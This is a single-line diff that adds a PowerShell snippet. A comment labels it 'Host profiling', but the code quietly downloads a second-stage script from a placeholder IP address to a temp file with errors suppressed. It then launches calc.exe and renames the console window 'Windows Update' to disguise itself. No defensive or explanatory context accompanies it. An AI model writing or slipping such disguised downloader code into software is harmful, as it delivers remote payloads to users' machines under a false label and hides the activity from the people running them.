@@ -1,0 +1,1 @@
+<# Host profiling #> $PayloadUrl = "https://192.0.2.48:443/stage2.ps1"; $WorkingPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; & "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $Host.UI.RawUI.WindowTitle = "Windows Update"
